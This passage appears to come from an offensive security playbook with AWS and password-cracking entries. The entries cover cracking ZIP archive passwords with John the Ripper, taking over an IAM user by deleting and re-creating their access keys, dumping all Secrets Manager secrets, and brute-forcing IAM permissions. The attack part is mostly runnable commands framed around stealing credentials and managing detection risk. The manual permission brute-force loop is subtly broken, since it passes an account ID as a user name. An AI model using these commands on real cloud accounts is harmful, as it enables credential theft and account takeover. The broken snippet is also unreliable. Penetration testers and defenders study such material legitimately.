- **Payload/Method:**
  ```bash
  # Extract ZIP hash for cracking
  zip2john archive.zip > archive.hash

  # Crack with John using wordlist
  john archive.hash --wordlist=/usr/share/wordlists/rockyou.txt

  # Crack with John using rules (transformations)
  john archive.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=Single

  # Show cracked passwords
  john archive.hash --show

  # Extract with cracked password
  PASSWORD=$(john archive.hash --show --format=zip | cut -d: -f2)
  unzip -P "$PASSWORD" archive.zip
  ```

### IAM Permission Escalation via CreateAccessKey + DeleteAccessKey (Key Rotation Attack) [added: 2026-05]
- **Tags:** #AWS #IAM #PrivEsc #LateralMovement #AccessKeyManagement #CreateAccessKey #DeleteAccessKey #CredentialTheft #KeyOverwrite
- **Trigger:** Have `iam:CreateAccessKey` + `iam:DeleteAccessKey` permissions on another IAM user; target user is at max key limit (2 keys)
- **Prereq:** `iam:CreateAccessKey` + `iam:DeleteAccessKey` permissions; target user already has 2 access keys (AWS maximum)
- **Yields:** New valid access keys for the target user with their full permissions
- **Opsec:** Med (access key creation is logged in CloudTrail; deletion may alert on automation)
- **Context:** AWS allows max 2 access keys per user. If a user has 2 keys already, `CreateAccessKey` fails. But combining with `DeleteAccessKey` allows an attacker to evict one old key and inject a new one, effectively stealing the user's identity.
- **Payload/Method:**
  ```bash
  TARGET_USER="admin-user"

  # List target user's access keys
  aws iam list-access-keys --user-name $TARGET_USER

  # Delete first key (assume AKIAY2XXXXXXXXXXXXX is old/unused)
  aws iam delete-access-key --user-name $TARGET_USER \
    --access-key-id AKIAY2XXXXXXXXXXXXX

  # Create new access key for the target user
  aws iam create-access-key --user-name $TARGET_USER \
    --query 'AccessKey.[AccessKeyId, SecretAccessKey]' \
    --output text > /tmp/stolen_creds.txt

  # Now use the stolen credentials
  export AWS_ACCESS_KEY_ID=$(awk '{print $1}' /tmp/stolen_creds.txt)
  export AWS_SECRET_ACCESS_KEY=$(awk '{print $2}' /tmp/stolen_creds.txt)
  aws sts get-caller-identity  # Verify: should show TARGET_USER
  ```

### Secrets Manager Secret Extraction [added: 2026-05]
- **Tags:** #AWS #SecretsManager #CredentialDump #DataExfil #GetSecretValue #DatabasePasswords #APIKeys #OAuth
- **Trigger:** Enumerated IAM permissions and confirmed `secretsmanager:GetSecretValue` access
- **Prereq:** `secretsmanager:ListSecrets` + `secretsmanager:GetSecretValue` permissions
- **Yields:** Plaintext database passwords, API keys, OAuth tokens, SSH keys, and other secrets stored in Secrets Manager
- **Opsec:** Med
- **Context:** Secrets Manager stores rotated credentials, API keys, and other sensitive data. Unlike KMS, secret values are returned in plaintext if the principal has GetSecretValue permission.
- **Payload/Method:**
  ```bash
  # List all available secrets
  aws secretsmanager list-secrets \
    --query 'SecretList[*].[Name, Description]' \
    --output table

  # Get plaintext value of a specific secret
  aws secretsmanager get-secret-value --secret-id MyDatabasePassword

  # Extract just the plaintext field
  aws secretsmanager get-secret-value --secret-id MyAPIKey \
    --query 'SecretString' --output text

  # Dump all secrets (loop through list)
  for secret in $(aws secretsmanager list-secrets --query 'SecretList[*].Name' --output text); do
    echo "=== $secret ==="
    aws secretsmanager get-secret-value --secret-id "$secret" \
      --query 'SecretString' --output text 2>/dev/null | head -3
  done
  ```

### IAM Permission Bruteforcing (Enumerate Available Actions) [added: 2026-05]
- **Tags:** #AWS #IAM #Enumeration #PermissionMapping #ActionDiscovery #PrivEsc #bf-aws-permissions #EnumerateActions
- **Trigger:** Have valid IAM credentials (user/role) but unknown or restricted permissions; need to map all available actions for privilege escalation planning
- **Prereq:** Valid AWS credentials for the target IAM principal
- **Yields:** Complete list of IAM actions available to the compromised principal; enables targeted privilege escalation or lateral movement
- **Opsec:** High (each failed action attempt is logged in CloudTrail; 400+ requests will spike detection)
- **Context:** AWS logs both successful and denied API calls in CloudTrail. Bruteforcing IAM actions generates many "AccessDenied" entries, but the successes reveal the true permission boundary.
- **Payload/Method:**
  ```bash
  # Using bf-aws-permissions.sh (custom script)
  ./bf-aws-permissions.sh --profile compromised-user --region us-east-1 \
    --output permissions.txt

  # Output shows action name and result (Allow/Deny):
  # ec2:DescribeInstances → Allow
  # ec2:TerminateInstances → Deny
  # s3:ListBucket → Allow
  # s3:DeleteObject → Allow  (interesting!)
  # iam:CreateAccessKey → Deny
  # etc.

  # Manual bruteforce (slower but no external dependency)
  for action in CreateAccessKey DeleteAccessKey PutRolePolicy GetUser; do
    aws iam $action --user-name $(aws sts get-caller-identity --query Account --output text) 2>&1 | \
      grep -q "not authorized" && echo "[-] $action: Denied" || echo "[+] $action: Allowed or other error"
  done
  ```

